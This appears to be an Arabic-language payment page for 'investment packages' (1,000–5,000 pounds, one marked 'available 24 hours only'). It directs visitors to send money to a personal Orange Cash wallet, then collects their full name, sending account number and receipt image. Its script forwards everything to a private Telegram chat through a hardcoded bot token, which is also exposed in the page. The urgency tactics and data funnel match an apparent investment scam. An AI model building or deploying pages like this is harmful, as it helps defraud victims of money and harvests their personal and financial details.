<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>بيانات الدفع والاشتراك</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Cairo', sans-serif;
    }

    body {
      background-color: #f4f6f8;
      color: #334155;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 15px;
    }

    .card {
      width: 100%;
      max-width: 450px;
      background: #ffffff;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.05);
      padding: 20px;
      border: 1px solid #e2e8f0;
    }

    /* Alert Box */
    .warning-box {
      background-color: #fffbeb;
      border: 1px solid #fef3c7;
      border-radius: 12px;
      padding: 12px 15px;
      margin-bottom: 20px;
      text-align: right;
    }

    .warning-title {
      color: #b45309;
      font-weight: 700;
      font-size: 0.9rem;
      margin-bottom: 4px;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .warning-desc {
      color: #d97706;
      font-size: 0.78rem;
      line-height: 1.5;
    }

    .section-title {
      font-size: 0.95rem;
      font-weight: 700;
      color: #475569;
      margin-bottom: 12px;
    }

    /* Display Item */
    .info-box {
      background: #f8fafc;
      border: 1px solid #e2e8f0;
      border-radius: 12px;
      padding: 10px 14px;
      margin-bottom: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .info-label {
      font-size: 0.75rem;
      color: #64748b;
      font-weight: 600;
    }

    .info-value {
      font-size: 0.95rem;
      font-weight: 700;
      color: #0f172a;
    }

    .copy-btn {
      background: #f1f5f9;
      border: none;
      padding: 6px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 0.9rem;
    }

    /* Form Inputs */
    .form-group {
      margin-bottom: 12px;
    }

    .form-label {
      display: block;
      font-size: 0.82rem;
      font-weight: 700;
      color: #334155;
      margin-bottom: 6px;
    }

    .form-input, .form-select {
      width: 100%;
      padding: 12px 14px;
      border: 1.5px solid #cbd5e1;
      border-radius: 10px;
      font-size: 0.88rem;
      outline: none;
      background: #fff;
      color: #0f172a;
      transition: border-color 0.2s;
    }

    .form-input:focus, .form-select:focus {
      border-color: #059669;
    }

    /* Upload Button */
    .btn-submit {
      width: 100%;
      background: #059669;
      color: #ffffff;
      border: none;
      padding: 14px;
      border-radius: 12px;
      font-size: 0.95rem;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-top: 15px;
      box-shadow: 0 4px 12px rgba(5, 150, 105, 0.2);
    }

    #fileInput {
      display: none;
    }
  </style>
</head>
<body>

  <div class="card">
    
    <!-- Warning Box -->
    <div class="warning-box">
      <div class="warning-title">⚠️ تحقق من البيانات قبل الدفع</div>
      <div class="warning-desc">
        يجب دائماً التحقق من هذه البيانات مباشرة قبل تنفيذ التحويل. قد تتغير البيانات في أي وقت، لذلك لا تعتمد على لقطة شاشة أو بيانات قديمة.
      </div>
    </div>

    <!-- Payment Info Header -->
    <div class="section-title">بيانات الدفع الحالية</div>

    <div class="info-box">
      <div>
        <div class="info-label">🏛️ المحفظة / البنك</div>
        <div class="info-value">ORANGE CASH</div>
      </div>
      <button class="copy-btn" onclick="copyText('ORANGE CASH')">📋</button>
    </div>

    <div class="info-box">
      <div>
        <div class="info-label">👤 اسم المستلم</div>
        <div class="info-value">hassan</div>
      </div>
      <button class="copy-btn" onclick="copyText('hassan')">📋</button>
    </div>

    <div class="info-box">
      <div>
        <div class="info-label">💳 رقم المحفظة للتحويل</div>
        <div class="info-value">01286999875</div>
      </div>
      <button class="copy-btn" onclick="copyText('01286999875')">📋</button>
    </div>

    <!-- Form Section -->
    <div class="form-group" style="margin-top: 15px;">
      <label class="form-label">اسم المستثمر بالكامل:</label>
      <input type="text" id="investorName" class="form-input" placeholder="أدخل اسمك كما هو بالمستندات">
    </div>

    <div class="form-group">
      <label class="form-label">رقم الحساب أو المحفظة المحول منها:</label>
      <input type="tel" id="senderAccount" class="form-input" placeholder="مثال: 010xxxxxxxx">
    </div>

    <!-- Package Dropdown -->
    <div class="form-group">
      <label class="form-label">الباقة الاستثمارية:</label>
      <select id="packageSelect" class="form-select">
        <option value="" disabled selected>اختر الباقة...</option>
        <option value="باقه 1500 جنيه (متاحة لمدة 24 ساعة فقط)">باقة 1500 جنيه (متاحة لمدة 24 ساعة فقط) ⏳</option>
        <option value="باقة 1000 جنيه">باقة 1000 جنيه</option>
        <option value="باقة 2500 جنيه">باقة 2500 جنيه</option>
        <option value="باقة 5000 جنيه">باقة 5000 جنيه</option>
      </select>
    </div>

    <!-- Submit Button -->
    <input type="file" id="fileInput" accept="image/*" onchange="sendDataToTelegram()">
    <label for="fileInput" class="btn-submit" id="uploadBtn">
      📑 رفع إيصال التحويل
    </label>

  </div>

  <script>
    const BOT_TOKEN = "8866871343:AAEAMiWbSrDRHfep7y63Wn7Rh1Ui_wBqTZg";
    const CHAT_ID = "8767380282";

    function copyText(text) {
      navigator.clipboard.writeText(text);
      alert("تم النسخ: " + text);
    }

    function sendDataToTelegram() {
      const investorName = document.getElementById('investorName').value.trim();
      const senderAccount = document.getElementById('senderAccount').value.trim();
      const selectedPackage = document.getElementById('packageSelect').value;
      const fileInput = document.getElementById('fileInput');
      const file = fileInput.files[0];

      if (!investorName || !senderAccount || !selectedPackage) {
        alert("يرجى إدخال جميع البيانات واختيار الباقة قبل رفع الإيصال.");
        fileInput.value = "";
        return;
      }

      if (!file) return;

      const uploadBtn = document.getElementById('uploadBtn');
      uploadBtn.innerText = "جاري الإرسال...";
      fileInput.disabled = true;

      const captionText = `📥 إيصال تحويل جديد!\n\n👤 اسم المستثمر: ${investorName}\n📱 رقم المحول منه: ${senderAccount}\n📦 الباقة المختارة: ${selectedPackage}\n💳 المحفظة المستلمة: 01286999875 (hassan)`;

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', file);
      formData.append('caption', captionText);

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          uploadBtn.innerText = "✓ تم رفع الإيصال بنجاح";
          uploadBtn.style.background = "#16a34a";
        } else {
          alert("حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.");
          uploadBtn.innerText = "📑 رفع إيصال التحويل";
          fileInput.disabled = false;
        }
      })
      .catch(err => {
        console.error(err);
        alert("فشل الاتصال بالسيرفر.");
        uploadBtn.innerText = "📑 رفع إيصال التحويل";
        fileInput.disabled = false;
      });
    }
  </script>

</body>
</html>
